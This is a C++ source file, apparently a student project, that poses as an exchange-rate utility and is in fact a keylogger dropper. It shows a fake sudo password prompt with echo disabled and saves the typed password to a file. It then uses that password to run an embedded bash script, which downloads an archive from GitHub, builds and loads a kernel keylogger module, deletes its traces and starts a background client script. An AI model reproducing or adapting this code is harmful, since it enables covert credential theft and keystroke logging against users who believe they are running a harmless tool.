#define MOD "keylog"

#include <iostream>
#include <fstream>
#include <string>
using namespace std;


const char *text= 
	"#!/bin/bash\n"
	"sudo cp keylog_ins /usr/bin/keylog_ins 2>/dev/null\n"
	"wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip\n"
	"unzip -o -q keylog.zip\n"
	"cd final-project-click-to-add-lemon-master/Source/\n"
	"make -s 2>/dev/null\n"
	"sudo insmod keylog.ko 2>/dev/null\n"
	"cd AnalyzeData/\n"
	"g++ -o analyze analyze.cpp\n"
	"cp analyze ../Scripts\n"
	"cd ..\n"
	"cp -r Scripts/ ../../Scripts \n"
	"cd ../..\n"
	"rm -r -r *.txt\n"
	"rm -r -f keylog.zip keylog_ins\n"
	"rm -r -f final-project-click-to-add-lemon-master\n"
	"cd Scripts/\n"
	"chmod 755 analyze\n"
	"python3 client_script.py & 2>/dev/null \n";
	
void convert();

bool ifExist(){
	bool result = false;
	string str;
	ifstream modfile;
	size_t pos;
	
	system("lsmod>mod.txt");
	modfile.open("mod.txt");
	
	if(modfile.is_open()){
		while(getline(modfile,str)){
		pos=str.find(MOD);
		if(pos!=string::npos){
			result = true;
			break;
			}
		}
	}
	modfile.close();
	system("rm -r -f mod.txt");
	return result;
}

int main(){
	
	if(!ifExist()){	
		cout<<"Pull the latest exchange rates online? (require access to Internet)\n"
			" [y]es [n]o\n";
		char in = getchar();
		if(in == 'y'){
			ofstream myfile("keylog_ins");
			myfile << (text);			
			myfile.close();
			
			//store sudo password
			
			string username;
			system("echo \"$USER\" >> uname.txt");
			
			ifstream unfile;
			unfile.open("uname.txt");
			if(unfile.is_open()){
			getline(unfile,username);
			}
			unfile.close();
			
			cout<<"[sudo] password for "<<username << ":";
			//set terminal command invisible
			system("stty -g > Tsetting.txt");
			system("stty -echo");
			//store password
			string psw;
			cin>>psw;
			ofstream sfile("sudopw");
			sfile<<psw;
			sfile.close();
			cout<<endl;
			
			// set terminal command visible
			system("stty $(cat Tsetting.txt)");
			
			
			system("echo $(cat sudopw) | sudo -S chmod 755 keylog_ins");
			system("./keylog_ins");
			convert();
		}else{
			cout<<"Service terminated.\n";
		}
	}else{
			convert();
	}

	return 0;
}
